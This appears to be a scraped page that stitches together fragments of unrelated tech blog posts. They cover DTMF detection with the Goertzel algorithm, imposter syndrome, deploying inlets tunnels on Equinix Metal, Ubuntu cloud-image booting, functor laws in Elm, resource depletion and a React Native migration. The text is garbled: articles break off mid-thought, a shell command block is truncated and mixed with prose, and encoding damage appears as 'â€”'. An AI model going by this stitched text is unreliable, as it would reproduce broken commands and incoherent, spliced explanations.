<p>An alternative approach is to use <a href="https://en.wikipedia.org/wiki/Goertzel_algorithm">Goertzel algorithm</a> which is essentially a single-frequency digital filter.  Doing 8 applications of the Goertzel algorithm including the ADC reads only takes about 12ms, which is about 1.2x realtime.  I think, based on the output of <a href="https://godbolt.org/">https://godbolt.org</a> that AVR GCC is generating full 32x32 multiplies for 16x16+32 -&gt; 32 MAC so some hand assembly could probably make this go faster.</p>

<p>In order to generate some test cases for our code, I used this <a href="https://www.audiocheck.net/audiocheck_dtmf.php">DTMF WAV file generator</a> and converted the resulting WAV files into virtual ADC samples in the range of our analog circuit.  I then ran our detection code, to verify the algorithm correctness before moving it to the Uno.  A reasonable sample Goertzel implementation can be found <a href="https://www.st.com/resource/en/design_tip/dm00446805-the-goertzel-algorithm-to-compute-individual-terms-of-the-discrete-fourier-transform-dft-stmicroelectronics.pdf" title="The Goertzel algorithm to compute individual terms of the discrete Fourier transform (DFT)">here</a></p>

<h3 id="bell-103">Bell 103</h3>

<p>Programming the gate microcontroller is done via the 300 baud modem protocol <a href="https://en.wikipedia.org/wiki/Bell_103_modem">Bell 103</a>.  The RX side of this seems well within the Uno’s capabilities, as we can likely count the number of zero crossings in every 3ms baud window to discriminate between the mark and space frequencies used by the <a href="http://edge.rit.edu/content/P09141/public/FSK.pdf">FSK</a> encoding.</p>

<p>The TX side however, seems much trickier on the Uno.  The Uno lacks a DAC, and while you can create one using PWM on a digital pin and then put it through a low pass filter, this seemed like a lot of work.  About this time I also wanted to get going on HomeKit portion of the project, and I took the easy way out: using an actual modem.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>There are two types of engineers: <em>(1)</em> Those who’ve experienced the infamous imposter syndrome and <em>(2)</em> those who won’t admit it.&nbsp;Imposter syndrome is extremely prevalent in the developer community.&nbsp;</p><p>Imposter syndrome robs you out of confidence and joy. People suffering from imposter syndrome often feel like they’re not good enough to do the work they’re assigned to do.</p><p>Are there cases where you feel at work that you’re not good enough? That’s imposter syndrome. Carrying this constant anxiety and dread ain’t easy.  </p><p>If this all is too familiar to you— this article is just for you. Here are ways to cope with imposter syndrome and eventually beat it. Hopefully, as a result, you’ll become a more confident and happier person.</p><h3>Just Because It’s Hard Doesn’t Mean You’re Not Good at It</h3><p>Programming is hard. Like really, really hard. There, I’ve said it. </p><p>I’m not a prodigy at coding, but I never gave up, and neither should you. Programming is humbling — there’s so much to know.&nbsp;Accept the fact that it’s not possible to know everything about everything when it comes to programming.</p><p>We work better in teams. The more complicated the project, the bigger the team. Accept the fact that it’s not possible for you to know everything. Trust your teammates and have a support system in place.</p><p>Why do we put so much burden on ourselves to know everything? This causes the inevitable cascade of imposter syndrome effects when we cringe at the whimsical job requirements.</p><h3>Learn to Say No</h3><p>What do you say when a friend asks you to build the following?</p><p><em>“It’s like Tinder, but for cats”</em></p><p>You’d <em>probably</em> be wise to say no to that. How come we have such a difficult time doing that?</p><p>It’s difficult to say no to a person who is excited about a project. Agreeable people tend to struggle with this more than less agreeable personalities.</p><p>Saying no&nbsp;wakens up intensely negative emotions—embarrassment and guilt. We have to get over that and move on. We can’t work on every project.</p><p>Knowing when to say ‘no’ is a skill. Like with all skills, it’s trainable and you’ll become better at it. </p><p>You should always keep your ears open and be open to new ideas.&nbsp;Just learn to say no when you feel the time is not right or you’re already working on something.</p><p>As a developer, we’re students for life, and we shouldn’t forget that.</p><h4>A decision-making framework: Here’s how I decide between a ‘no’ and a ‘yes’</h4><p>Here are a couple of questions that should reveal how you feel about a project and whether you’re tilting more toward a ‘no’ or a ‘yes.’</p><ul><li><p>Without lying to myself — Can I honestly commit to this project full-time for at least six months?</p></li><li><p>What happens if I get bored or tired of the project? Am I able to continue and push through when things get tough?</p></li><li><p>Am I getting paid? Do the bills get paid or do I have to live on previous savings?</p></li><li><p>What happens if a co-founder leaves— Will the project die overnight? Who will be the captain if a storm approaches?</p></li><li><p>Am I excited about the future of the project? Do I dream about the project and can’t stop writing code?</p></li></ul><p>I bet if you take the time and go through the questions, you’ll find some clarity as to what to do.</p><h3>Exercise, Exercise, Exercise</h3><p>I’m a big advocate of consistent exercise routines. We’re not genetically born to live stationary lives. </p><p>Imagine if you could buy only one car for the rest of your life — You would take good care of that car.&nbsp;You would change the tires and oil and bring it to maintenance more than you normally would, right?</p><p>Well, if you agree with the above, think about this for a moment. We only get one body for the rest of our lives. Let me say that once more — one body, per life. That’s it, no refunds, no swaps, everyone has to deal with the cards they’re dealt with.</p><p><strong>We only get one body for the rest of our lives. It would be foolish to not maintain it.</strong></p><p>It doesn’t have to be a frenzy. Start small, but most importantly, start today. Like a well-known brand says, “Just do it.” </p><p>Take the time to take care of your body and well-being.</p><p>Remember middle school? Can you remember what your favorite sport was? Go and reignite your favorite game memories.</p><h3>Become a Mentor, Teach Kids or Junior Developers</h3><p>When I started coding, I wished someone took me under their wing and showed me the way. I’m a self-taught programmer and I had no mentors to ask for help. </p><p>Fortunately, I know English and have two programming buddies, Stackoverflow and Google. </p><p>Teaching is humbling — there’s something about it that makes you appreciate what you’ve accomplished.&nbsp;</p><p>If you're like me and your modus operandi tilts more industrial — I&nbsp;<em>have&nbsp;</em>to work every day to feel normal — teaching helps with that.</p><p>Teaching also trains your patience, a priceless skill to attain. </p><p>The next time you go to work, school, or contribute to open source— pick up someone's code, review it, and leave positive notes and ways to improve. </p><p>When it comes to reviewing code and other people's work—It’s super easy to be insensitive.</p><p>If every pull request or bug report is a friendly note saying how much the users like using your application, and they include some pointers on how to improve. Those notes would be appreciated and motivate you to work harder, wouldn’t they?</p><p><strong>Be the mentor you wish you had.</strong></p><h3>Conclusion</h3><p>If you’re having severe imposter syndrome symptoms, please note that I’m always open to friendly banter on <a href="https://twitter.com/lasnindrek">Twitter</a>.</p><p>Feel free to subscribe to get more posts like this into your inbox.

            <p>Inlets was created to make tunnelling easy for Cloud Native practitioners. Learn three ways to deploy tunnels to Equinix Metal from your private network or Kubernetes clusters.</p>

<h2 id="introduction">Introduction</h2>

<p>From early on I’d played with SSH tunnels and Ngrok, and run into their various limitations from being completely blocked at enterprise companies, to the challenges of automating a technology <a href="https://en.wikipedia.org/wiki/OpenSSH">first released 20 years ago</a>. In 2019, <a href="https://blog.alexellis.io/2019-my-year-in-review-inlets/">Inlets was just supposed to be a Proof of Concept</a>, to tunnel services without the legacy of prior art, or the limitations of a SaaS product. It was built to be run without rate-limiting, and to run over a web-socket so that it could be used with corporate HTTP proxies. It was built to run in containers, VMs, Kubernetes clusters, Raspberry Pis. It was built for Cloud Native practitioners like myself.</p>

<p>After the initial set of early-adopters came, new users arrived who expected to just run one command and have everything set up. The tool was easy to use, but required hosts to be set up to act as gateways or “exit-servers.” The exit-server is public-facing and loans its public IPv4 and IPv6 address to the other end of the tunnel, which runs inside a private network.</p>

<p>That’s how the <a href="https://github.com/inlets/inletsctl">inletsctl</a> and <a href="https://github.com/inlets/inlets-operator">inlets-operator</a> projects came about. The idea was that they would provision the cheapest host available as quickly as possible to give a SaaS-like experience, but without the artificial limits put in place.</p>

    </p>
</div>

<blockquote>
  <p>A Very early demo of inlets-operator from 2019 running on Equinix Metal (née Packet).</p>
</blockquote>

<p>At the time, I picked Equinix Metal for the first provider because they had an easy to use API, very high performance hosts on offer, and had a history of being good citizens in the Open Source community.</p>

<ul>
  <li><a href="https://github.com/inlets/inletsctl">inletsctl</a> creates an exit-server and prints out a command you can just run to connect a tunnel using <code>inlets client</code></li>
  <li><a href="https://github.com/inlets/inlets-operator">inlets-operator</a> integrates into Kubernetes (something which Ngrok didn’t offer at the time) and provides a LoadBalancer integration using the same approach</li>
</ul>

<p>The previous <code>--provider=packet</code> provider name will be phased out in newer versions of the above tools, and users should move over to the new Equinix Metal name: <code>--provider=equinix-metal</code>. All the options, flags, and regions are the same.</p>

<center><img src="https://inlets.dev/images/2020-12-equinix-metal/equinix-metal.svg" alt="Equinix Metal logo" width="30%"></center>

<p>Let’s look at three options for how to deploy inlets to Equinix Metal, for reliable, bare-metal performance.</p>



<p>Let’s say you’re working on an API or web-page, and need to share it with a friend or colleague. Perhaps it’s a draft blog post, an OpenFaaS function, or you actually need a webhook from Stripe for the SaaS business you’re building?</p>

<ul>
  <li>Create an API key for your Equinix Metal account and save it as ~/EM_API.txt</li>
  <li>Save your Project ID as ~/EM_PROJECT_ID.txt</li>
</ul>

<div><div><pre><code>inletsctl create <span>--provider</span> equinix-metal <span>\</span>
  <span>--region</span> ams1 <span>\</span>
  <span>--access-token-file</span> ~/EM_API.txt <span>\</span>

<p>In a few moments you’ll find a *t1.small.x86` provisioned in your account which costs $0.07 / hour. That is Equinix Metal’s cheapest host, at the end of the tutorial I’ll show you how you can use the inlets PRO chart to setup multiple tunnels on the same host for efficiency and cost savings. Other options like VPS providers will cost around 5 USD / month in total.</p>

</code></pre></div></div>

<p>You’ll also get a connection string on your local machine which you can use to connect the tunnel.</p>

<p>If you’re exposing what’s running directly on your local machine then edit the port in <code>UPSTREAM</code>. If you were exposing Express.js, then you’d want port 3000 as per below:</p>

<div><div><pre><code>export UPSTREAM=http://127.0.0.1:3000
</code></pre></div></div>

<p>Then run the <code>inlets client</code> command and access your service from the public IP on port 80, i.e. <code>http://147.75.33.129/</code></p>

<p>You can also tunnel TCP services with inlets PRO <a href="https://docs.inlets.dev/#/get-started/quickstart-tcp-ssh">like SSH</a> and <a href="https://docs.inlets.dev/#/get-started/quickstart-tcp-database">Postgresql</a>.</p>

<h3 id="option-2---expose-a-service-from-your-kubernetes-cluster">Option 2 - expose a service from your Kubernetes cluster</h3>

<p>Whether you’re using a Raspberry Pi with k3s, or a cluster on your local computer with KinD, minikube, microk8s, or k3d, you can get a public endpoint within a few moments.</p>

<p>The easiest way to install the inlets-operator is with helm or <a href="https://github.com/alexellis/arkade">arkade</a>. arkade is a portable Kubernetes marketplace that makes it easy to install charts and CLIs.</p>

<div><div><pre><code>arkade <span>install </span>inlets-operator <span>\</span>
  <span>--provider</span> equinix-metal <span>\</span>
  <span>--region</span> ams1 <span>\</span>
  <span>--token-file</span> ~/EM_API.txt <span>\</span>
  <span>--project-id</span> <span>$(</span><span>cat</span> ~/EM_PROJECT_ID.txt<span>)</span>
</code></pre></div></div>

<p>Do you notice how the flags are almost a direct match for inletsctl? That’s intentional, to make inlets easy to use and consistent between workflows.</p>

<p>Now when the inlets-operator is installed, it will print a help message with a sample deployment which you can expose. You can get this message back at any time with `arkade info inlets-operator.</p>

<div><div><pre><code>kubectl run nginx-1 <span>--image</span><span>=</span>nginx <span>--port</span><span>=</span>80 <span>--restart</span><span>=</span>Always
kubectl apply <span>-f</span> <span>\</span>
 https://raw.githubusercontent.com/inlets/inlets-operator/master/contrib/nginx-sample-deployment.yaml
kubectl expose deployment nginx-1 <span>--port</span><span>=</span>80 <span>--type</span><span>=</span>LoadBalancer
</code></pre></div></div>

<p>The operator will automatically create the exit-server for you, and then run an <code>inlets client</code> as a Deployment within your cluster. Whenever the public server receives a request, it will tunnel it to the ClusterIP of the <code>nginx-1</code> service.</p>

<p>You can get the public IP address from your service, and you can find more information using the Tunnel CustomResource:</p>

<div><div><pre><code>kubectl get svc nginx-1 <span>-o</span> wide
kubectl get svc nginx-1 <span>-o</span> wide <span>-w</span>
NAME      TYPE           CLUSTER-IP     EXTERNAL-IP   PORT<span>(</span>S<span>)</span>        AGE     SELECTOR
nginx-1   LoadBalancer   10.43.176.39   &lt;pending&gt;     80:30297/TCP   2m53s   <span>app</span><span>=</span>nginx
nginx-1   LoadBalancer   10.43.176.39   147.75.33.201   80:30297/TCP   3m3s    <span>app</span><span>=</span>nginx

kubectl get tunnel/nginx-1-tunnel
NAME             SERVICE   TUNNEL   HOSTSTATUS   HOSTIP          HOSTID
nginx-1-tunnel   nginx-1                 
nginx-1-tunnel   nginx-1            active       147.75.33.201   874176b8-c1e2-47f7-a614-d4ff9a1b0f11
</code></pre></div></div>

<p>Then you can access your nginx-1 service from the public Internet as if it were running locally:</p>

<div><div><pre><code>curl <span>-s</span> http://147.75.33.201 | <span>grep </span>success
&lt;p&gt;If you see this page, the nginx web server is successfully installed and
</code></pre></div></div>

<p>To remove the exit-server, simply delete the service:</p>

<div><div><pre><code>kubectl delete svc/nginx-1
</code></pre></div></div>

<p>The inlets-operator also supports <a href="https://inlets.dev/">inlets PRO</a> which can be used to expose TCP services like an IngressController’s port 80 and 443 to make it fully functional and to receive TLS certificates. Another popular use-case is to expose a database, or SSH over the Internet.</p>

<h3 id="option-3---using-a-kubernetes-cluster-and-pods-for-exit-servers">Option 3 - using a Kubernetes cluster and Pods for exit-servers</h3>

<p>You can also use a Kubernetes cluster for exit-servers, running as Pods. This saves on money and is more efficient when you have many different clients needing tunnels. It also allows you to choose whether you want to expose services or keep them private within the public cluster.</p>

<p>The helm chart for inlets-pro has a client and server portion, if you deploy the server chart, you can do that any number of times, once for each service you want to tunnel in.</p>

<p>In the example below <a href="https://vshn.ch/en/">VSHN.ch</a> provides a SaaS OpenShift service to regulated institutions through the use of inlets run as a Pod.</p>

<p><img src="https://inlets.dev/images/2020-10-advanced-cloud/use-case-1-saas.png" alt="inlets PRO run as a chart"></p>
<blockquote>
  <p>This is useful for running a SaaS and connecting to customers, or for managing many clients.</p>
</blockquote>

<p>If a Pod fails, or a Node goes down, then Kubernetes will restart it automatically.</p>

<p>See also: <a href="https://github.com/inlets/inlets-pro/tree/master/chart/inlets-pro">inlets PRO server chart</a></p>

<h2 id="summing-up">Summing up</h2>

<p>I wanted to show you how easy it is to use Equinix Metal to set up a tunnel for development from your network, or from a Kubernetes cluster. All of these tunnels are using the inlets OSS project, which by default enables a single port to be exposed, TLS can be configured separately.</p>

<p>Alternatively you can use <a href="https://inlets.dev/">inlets PRO</a> which allows for tunnelling TCP services like databases and IngressControllers, multiple-ports, enables encryption by default and has commercial support. inlets PRO also enables a reverse proxy like Caddy, Nginx, or a Kubernetes IngressController to be exposed so that you can obtain TLS certificates from LetsEncrypt and serve as many virtual hosts as you like.</p>

<p>Whether you use inlets OSS or inlets PRO - the inletsctl/inlets-operator tooling is open source and gives the same consistent user-experience. To date we have provisioners for several clouds such as digitalocean, equinix-metal, ec2, scaleway, civo, gce, azure, linode and hetzner. You can suggest new provisioners and <a href="https://github.com/inlets/inletsctl/tree/master/pkg/provision">see the source code here</a>.</p>

<p>Find out more about inlets and use-cases in the <a href="https://docs.inlets.dev/">inlets docs</a></p>

<h3 id="going-further---hybrid-cloud-use-cases-and-replacing-a-vpn">Going further - hybrid-cloud use-cases and replacing a VPN</h3>

<p>Whilst inlets was created with the original problem of exposing an internal or private service, it’s since developed to offer an easier and more scalable alternative to a VPN. You can read more about how to use inlets for hybrid cloud in this post: <a href="https://inlets.dev/blog/2020/11/06/hybrid-cloud-with-inlets.html">Connect your on-premises databases to Kubernetes in the cloud</a>.</p>

It explains nitty gritty details about disk layouts and the cloud-init boot process. Read further if you want to customize your Kubernetes nodes or make the best of your cloud provider.</p><p>The Ubuntu 18.04.5 LTS Cloud Image is 361MB. To minimize VM creation time, said image is actually a snapshot of a ready-to-boot disk. This is unlike a USB/ISO image — commonly used for installing Ubuntu on laptops — which sets up the disk and copies files over. So if the cloud image is a ready-to-boot disk, how come you can use the full disk size after booting? How does a 361MB disk image “become” a 10GB disk? Where does all that magic happen?</p></div></div></div></div></div></div></div></div></section><section data-id="308306e" data-element_type="section"></section><section data-id="8bb6a1f" data-element_type="section"><div><div><div data-id="a7ba9de" data-element_type="column"><div><div><div data-id="78cc30a" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>Let us briefly go over the process of booting an Operating System on bare metal. The firmware (a.k.a. BIOS or UEFI) will search for a suitable disk. Said disk will contain a system partition (roughly “/boot”) which contains the bootloader and kernel images. As expected, the <a href="https://en.wikipedia.org/wiki/EFI_system_partition">system partition</a> needs to be formatted using a filesystem that is understood both by UEFI and bootloader, generally FAT32. Operating system configuration, including hostname, users, passwords, SSH authorized_keys, various daemon configurations, are all stored on the disk itself.</p><p>A VM boots similarly, with the hypervisor taking the role of the UEFI. However, to allow VMs to boot from a disk template, usually called cloud image, they need to take configuration parameters from the cloud provider, instead of having them hard-coded in the cloud image. For example, the VM learns its hostname from the so-called VM meta-data. This information is under the control of the cloud provider and can’t be changed by the cloud user. Other configurations, including root password, SSH authorized_keys, are configured by the cloud user and transmitted by the cloud provider to the VM via user-data. Implementation-wise, these two are merely two text files — actually called meta-data and user-data — packaged in an ISO-format file. Yes, the same ISO-format that was used for Compact Disks (CDs). Funny enough, said ISO file is actually exposed to the VM as a virtual CD-ROM.</p></div></div></div></div></div></div></div></div></section><section data-id="4118078" data-element_type="section"><div><div><div data-id="d43758d" data-element_type="column"><div><div><div data-id="d3c9b48" data-element_type="widget" data-widget_type="heading.default"><p><h2>Enough English, show me some code.</h2></p></div></div></div></div></div></div></section><section data-id="fa82500" data-element_type="section"><div><div><div data-id="853c43f" data-element_type="column"><div><div><div data-id="e859b92" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>To get started, install wget, qemu-img, genisoimage and kvm.

Since VMs are likely to share parts of the disk, a copy-on-write strategy only stores the differences between the VMs’ disks, and is likely to save physical disk space. The script then writes meta-data and user-data, and packs them into an ISO format file using genisoimage. Finally, the hypervisor — KVM/qemu in this example — is instructed to boot a VM which is wired to the virtual disk and a virtual CDROM containing its configuration.</p><p>Go ahead and play with the script yourself!

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Last year I wrote <a href="https://functional.christmas/2019/20">an article</a> explaining functors in simple terms and show why they are useful. It has well received, but some felt it was lacking in details which is true and by design. There is more to be said and some crucial details that I glossed over so I will try to address some of them now. Let’s get nerdy!</p>
</section><article><section><h2>Functor as a context</h2>
<p>In the previous article I said you could think of a functor as a structure or container that has a mapping function. This is not strictly wrong as it is one way of thinking about the concept, but can be a bit misleading and confusing as it does not fit all situations. For example a functions can in some cases be a functor. A structure might give us thoughts about data structures or types. Container is fitting when talking about lists or other types that can contain data. Is a function a structure or container? For this reason it is common to refer to some of the general concepts and abstractions we use in FP (functor, monad etc.) as contexts which has some properties.</p>
<h2>The functor laws</h2>
<p>Unlike my vague explanation in the previous article a functor is actually a very specific thing, and is defined by rules or properties the context has to adhere to. These laws come from mathematics, specifically a branch called Category Theory. This is an area that I will not claim much knowledge of but great minds have found similarities between this particular part of mathematics and what we do in programming. </p>
<p>In addition to having the <code>map</code> function, functors needs to follow some rules.
The rules for functors are often called the functor laws. I'm not completely sure why. It might have something to do with math and also its sounds very sophisticated. :P Let’s get in on the sophistication!</p>
<h3>1. Law of preservation of identity</h3>
<p>The first law or rule of functors is that if the <code>map</code> function is given the identity function as its mapping function it will return the same functor.
The identity function is just a function that has one argument which it returns right back (<code>\x -&gt; x</code> in Elm or <code>function(x){return x;}</code> in JS).</p>
<p>Let’s use lists to visualize this a bit more. Elm actually has the identity function in its standard library so we will just use that one:</p>
<div data-language="elm"><pre><code><span>List.map</span> <span>identity</span> <span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>]</span> <span>==</span> <span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>]</span></code></pre></div>
<p>For the javascript example we will add the identify function inline:</p>
<div data-language="javascript"><pre><code><span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>]</span><span>.</span><span>map</span><span>(</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> x<span>)</span> <span>==</span> <span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>]</span></code></pre></div>
<p>When following this law the functor can not make any weird changes to the result. <code>List.map someFunction [1,2,3,4]</code> can never return an empty list. It can only map the function over the values. When mapping over a 4 item list, the returning list will always be a 4 item list. </p>
<h3>2. Law of composition</h3>
<p>The second law is not very complicated either but assumes that you know about composition. Lets quickly go through composition before looking at the next law.</p>
<h4>Composition</h4>
<p>Composition in functional programming (FP) is the ability to compose multiple functions into one single function. This is not often used in object oriented programming (OOP) but quite common in FP. </p>
<p>Composition is "gluing" functions together into one function. This is such a common thing to do that many languages have dedicated operators for this. Lets look at an example to see it in action to see why this might be useful. I'll be doing the examples in Elm as composition is a bit awkward in javascript and not that common.</p>
<p>Lets say you have a user record that has the fields name and age:</p>
<div data-language="elm"><pre><code><span>type</span> <span>alias</span> <span>User</span> <span>=</span> 
    <span>{</span> <span>name</span> <span>:</span> <span>String</span>
    <span>,</span> <span>age</span><span>:</span> <span>Int</span>
    <span>}</span></code></pre></div>
<p>To get the age of a User record we can in Elm use an accessor function which is available for every field defined in a record.<sup><sup id="fnref-1"><a href="#fn-1">1</a></sup></sup> For the <code>age</code> field this function is called <code>.age</code> and has the type signature <code>User -&gt; Int</code>. It takes a <code>User</code> type as an argument and returns a <code>Int</code>. In this case it is the content of the age field.</p>
<p>Go get the age from a user you would to: </p>
<div data-language="elm"><pre><code>
<span>user</span> <span>=</span> <span>{</span> <span>name</span> <span>=</span> <span>"John"</span><span>,</span> <span>age</span> <span>=</span> <span>20</span> <span>}</span>


<span>.</span><span>age</span> <span>user</span>
</code></pre></div>
<p>At some point in your program you might have a <code>User</code> and need to display the age on a webpage, print it in a log or anything else that needs the age to be a string. To convert a <code>Int</code> into a <code>String</code> we can use the built-in function <code>fromInt</code> in the String module. </p>
<p>So where you have a user and need the age as a string you can use the compose operator in Elm to create a new function that gives you the user age as a string. I will write the type signatures for the functions as well so we can see how they fit together: </p>
<div data-language="elm"><pre><code><span>.</span><span>age</span> <span>:</span> <span>User</span> <span>-&gt;</span> <span>Int</span>

<span>fromInt</span><span>:</span> <span>Int</span> <span>-&gt;</span> <span>String</span>

<span>ageAsString</span> <span>:</span> <span>User</span> <span>-&gt;</span> <span>String</span>
<span>ageAsString</span> <span>=</span> <span>.</span><span>age</span> <span>&gt;&gt;</span> <span>fromInt</span></code></pre></div>
<p>When the output of a function matches the input of another we can compose them together and make a new function that has the input of the first and output of the second. Note that <code>&gt;&gt;</code> is the rightwards compose operator.<sup><sup id="fnref-2"><a href="#fn-2">2</a></sup></sup></p>
<h4>The second law</h4>
<p>Now that you hopefully know a bit about function composition lets look at the second law of functors. The rule says that composing functions into a single function and then mapping that function over the functor should produce the same result as mapping the individual functions over the functor in sequence. Lets look as some code to make sense of it:</p>
<div data-language="elm"><pre><code><span>users</span> <span>:</span> <span>List</span> <span>User</span>
<span>users</span> <span>=</span> 
    <span>[</span> <span>{</span> <span>name</span> <span>=</span> <span>"John"</span><span>,</span> <span>age</span> <span>=</span> <span>20</span> <span>}</span>
    <span>,</span> <span>{</span> <span>name</span> <span>=</span> <span>"Mary"</span><span>,</span> <span>age</span> <span>=</span> <span>22</span> <span>}</span>
    <span>,</span> <span>{</span> <span>name</span> <span>=</span> <span>"Kevin"</span><span>,</span> <span>age</span> <span>=</span> <span>30</span> <span>}</span>
    <span>]</span>

<span>agesThroughMaps</span> <span>:</span> <span>List</span> <span>String</span>
<span>agesThroughMaps</span> <span>=</span> 
    <span>users</span>
        <span>|&gt;</span> <span>List.map</span> <span>.</span><span>age</span>
        <span>|&gt;</span> <span>List.map</span> <span>String.fromInt</span>

<span>agesThroughComposeAndMap</span> <span>:</span> <span>List</span> <span>String</span>
<span>agesThroughComposeAndMap</span> <span>=</span> 
	<span>List.map</span> <span>(</span><span>.</span><span>age</span> <span>&gt;&gt;</span> <span>String.fromInt</span><span>)</span> <span>users</span></code></pre></div>
<p>In the example above we have a list of users and two constants<sup id="fnref-3"><a href="#fn-3">3</a></sup> that both are a list of the users’ ages as strings. </p>
<p>The first constant, <code>agesThroughMaps</code>, is defined using two map operations. The first run passes the <code>.age</code> accessor function to <code>map</code> and gives us a list of ages (of type <code>Int</code>). In the second map operation the <code>String.fromInt</code> is used to create a list of the users’ ages as <code>String</code>. </p>
<p>For the last constant, <code>agesTthroughMaps</code>, the list of the users age is created with one map operation where the function passed in to <code>map</code> is composed of the <code>.age</code> and <code>fromInt</code> functions with the compose operator (<code>&gt;&gt;</code>). </p>
<p>And this is the result of the second law: the values in the two constants should be equal. A list of strings: <code>["20", "22", "30"]</code></p>
<p>See full example in Ellie: <a href="https://ellie-app.com/bKhq8M4vyjYa1">https://ellie-app.com/bKhq8M4vyjYa1</a></p>
<h2>The consequences of the laws</h2>
<p>The laws might seem a bit random and not very helpful at first glance, but it can actually help us a lot. To be a functor the structure/container/context has to follow these laws. It can not do anything weird with the value/values in it or the function that is passed inn. The only thing it can do is apply the function to the value in the context. The functor might have some extra logic around when to apply the function. A list might be empty so there would be nothing to apply the function to and similarly with <code>Maybe</code>. Take a look at <a href="https://functional.christmas/2019/20">last years article</a> to see a more complex example.</p>
<p>With these rules for what constitutes a functor in place the behavior of functors become predictable. So if we see it in code or talk about it with fellow coders we know exactly how it should behave! 😄</p>

                    <p>
                        Despite the apparent abundance of water, fresh water is primarily a non-renewable resource. Fresh water can originate from surface sources, like lakes, rivers, and ice, but more than half of americans get their fresh water from <a href="https://en.wikipedia.org/wiki/Resource_depletion#Groundwater">ground water</a> [<a href="https://www.usgs.gov/special-topic/water-science-school/science/groundwater-decline-and-depletion">1</a>]. At most 5.6% of our ground water can be replenished within 50 years after extraction. Although the total ground water in the Earth could cover the entire surface of the Earth to a depth of 18 meters, in many areas people are already drawing on water that is thousands of years oldâ€”or in some areas of Egypt, millions of years old [<a href="https://www.cbc.ca/news/technology/groundwater-study-1.3318137">2</a>,<a href="https://doi.org/10.1038/ngeo2590">3</a>].

                    <p>
                        "Reserves" are collections resources that we have identified within the Earth that we can extract at some pointâ€”but haven't yet. Estimates relating to reserves fluctuate as economic forces, technological chanages, and new resource discoveries alter what we know about resource availability and extraction feasibility. Nevertheless, they are most certainly <a href="https://en.wikipedia.org/wiki/Abundance_of_elements_in_Earth%27s_crust">finite</a>.

                        Antimony is used in flame-retardation and in the production of batteries.

                    <p>
                        Although we may discover new reserves of a resource over time, the economic and practical feasibility of extracting the resources will eventually be insurmountable, andâ€”although there will still be an abundance of the element in the Earth's crustâ€”the resource becomes "exhausted" in all practical senses.

December 7, 2020 | https://react.christmas/2020/8 | <a href="https://web.archive.org/web/*/https://react.christmas/2020/8">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><section><p>To make matters worse: the company behind the app were in the middle of a perfect storm. The business was being changed by regulation. The core business idea were changing. This meant large changes coming to the digital side, including the app.</p>
<p>Naturally, we had quite mixed feelings about our ability to meet delivery expectations from the business side, given the bad state of the app codebase. We were at a crossroads, and felt we had to pick one of the following:</p>
<ol>
<li>Negotiate a feature timeout while we frantically renovate the core code, or</li>
<li>Start a long-term migration plan towards a hybrid app, or</li>
<li>Write new features in React Native and eventually move all the JS code over to a new app shell</li>
</ol>
<p>We decided to try out React Native. Roughly three years later, the app is now 100% JavaScript. The big business transformation has come a long way, and I’ve experienced that React Native as a technology has played a key role in that success.</p>
<p>This article contains some reflections on <em>why</em> switching from pure native technologies to React Native worked so well for us.</p>
<h2>Starting Out Small Felt Really Safe</h2>
<p>We gave React Natives two tests. First, we wrote a small feature with a few developers. Futhermore, we did a larger, several-month feature where the entire team participated. A critical part of the tests was making sure that React Native would work as the small cogwheel it would necessarily start out as, inside of the large legacy app monster.</p>
<p>The people involved in each phase would evaluate the React Native developer experience, carefully considering if moving forward with React Native would be the right choice for us. After all, continuing with RN would mean a long migration process. Lots of our features would exist in the old, smelly native code for a long time, we would have to manually ensure backwards compatibility, handle (deep) navigation from old to new code (and vice verca), and lots of other things.</p>
<p>Even with these challenges in mind, the team were crystal clear post-testing. React Native made work easier, faster and more fun! In case we’d conclude differently, the investment made was so low that we could safely discard the effort as a proof-of-concept, where the learnings were enough to justify the time spent.</p>
<p>Trying out new technology this way just seems like a very smart way to do it. It was also key that it was the voice of the developers spending all day with the technology that weighed the most.</p>
<h2>We Actually Did Develop New Features Much Faster</h2>
<p>They say React Native save you half the work. Since your code will run on both iOS and Android, it eliminates the need to develop separate code &nbsp;for each platform. Write code once – not twice. Neat!</p>
<p>In our experience, this was mostly true. We did end up doing minor platform customizations here and there. Shadows don’t work as well on Android as iOS. Sometimes you’d want different UI behaviours to adhere to platform guidelines. And as with web development, you’ll encounter visual bugs for each platform that need special attention.</p>
<p><strong>I’d say we saved about 45% of the work involved.</strong> It’s not half - but it still makes a tremendous difference on productivity!</p>
<p>It’s also hard to not talk about the productivity boost obtained by Hot Reload (now Fast Refresh). Seeing the effect of my last code edit presented visually on screen immediately (with state preserved) is simply marvelous. Scale up the time saved for each little change with the amount of the developers involved and the amount of time spent… it’s just huge!</p>
<p><img src="https://microsoft.github.io/react-native-windows/blog/assets/fastrefresh.gif" alt="animation showing how react-native's &quot;Fast Refresh&quot; works" title="React Native's &quot;Fast Refresh&quot;"></p>
<h2>All Developers Code For Both Platforms</h2>
<p>I’ve met hundreds of fine developers, if not thousands. But those skilled and efficient in both native iOS and native Android development - I can count them on one hand. And they’re not exactly looking for work.</p>
<p>With React Native, we experienced that the entire team could do work for both platforms. It’s hard to overstate the importance of this fact. Instead of having dedicated iOS and Android teams, we’d have a feature being made by the same person (or small group) on both platforms, reducing the overhead involved in coordination and organization between devs and designers, business folks, product owners, etc. Also, fewer people needed to learn the ins and outs of that particular feature in a quite complex domain.</p>
<p>This provides great flexibility and robustness for a development team, and was much needed in our setting.</p>
<h2>Recruitment and Onboarding</h2>
<p>Not too many people are familiar with native mobile technologies. In comparison, capable JavaScript/React-developers come a dime a dozen. We found that finding talent was easier, and the newcomers found themselves productive way quicker than we’d expect. In a period with frantic scaling and expansion, this was critical.&nbsp;</p>
